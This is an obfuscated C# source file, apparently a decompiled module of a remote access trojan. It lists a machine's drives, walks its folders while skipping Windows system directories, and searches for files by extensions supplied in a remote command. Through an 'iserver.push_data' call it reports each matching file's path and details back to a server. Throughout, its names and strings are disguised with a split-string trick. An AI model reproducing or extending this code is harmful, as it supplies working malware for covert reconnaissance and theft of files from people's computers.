using System;
using System.Collections.Generic;
using System.IO;

namespace rlbwrarhsa;

internal class DLRZRIVF
{
	public MLREDM iserver;

	public List<string> rlbwrarhsafExts = new List<string>();

	public List<string> rlbwrarhsanotFilders = new List<string>();

	public string rlbwrarhsamainPath;

	public int rlbwrarhsasIndx = 0;

	public List<string> rlbwrarhsasFiles = new List<string>();

	public string rlbwrarhsafilesLogs = DLAONIF.rlbwrarhsafilesLogs;

	public int rlbwrarhsafIndx = 0;

	public bool rlbwrarhsareaging = false;

	public string rlbwrarhsalookupDrives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|rlbwrarhsa".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public bool rlbwrarhsaseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public DLRZRIVF()
	{
		rlbwrarhsanotFilders.Add("msocache|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("recoveDSDF|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("documents and settings|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("program files|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("system volume information|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("$recycle.bin|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("windows|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("program files (x86)|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		rlbwrarhsanotFilders.Add("programdata|rlbwrarhsa".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> rlbwrarhsaaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.rlbwrarhsaautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (rlbwrarhsaseeAccess(text) && !rlbwrarhsanotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void rlbwrarhsasendSearch(string path)
	{
		try
		{
			foreach (string item in rlbwrarhsaaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (rlbwrarhsafExts.Contains(text.ToLower()))
				{
					string text2 = iserver.rlbwrarhsafile_info(item, ret: true);
					iserver.rlbwrarhsapush_data(null, "rlbwrarhsa-searf=|rlbwrarhsa".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|rlbwrarhsa".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.rlbwrarhsaautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string rlbwrarhsalookupFiles(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|rlbwrarhsa".Split(new char[1] { '|' })[0];
			}
		}
		else
		{
			text = null;
		}
		return text;
	}

	public string rlbwrarhsacheckFolders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (rlbwrarhsaseeAccess(text2))
				{
					text = text + text2 + ">|rlbwrarhsa".Split(new char[1] { '|' })[0];
				}
			}
			return text;
		}
		return null;
	}

	public void rlbwrarhsalookFiles(string tempStr)
	{
		iserver.rlbwrarhsaautCnls = false;
		rlbwrarhsafExts.Clear();
		rlbwrarhsasFiles.Clear();
		rlbwrarhsafIndx = 0;
		rlbwrarhsasIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				rlbwrarhsafExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			rlbwrarhsareaging = true;
			rlbwrarhsasendSearch(array[1]);
			rlbwrarhsareaging = false;
			iserver.rlbwrarhsapush_data(null, "rlbwrarhsa-seard=searched|rlbwrarhsa".Split(new char[1] { '|' })[0]);
		}
	}
}
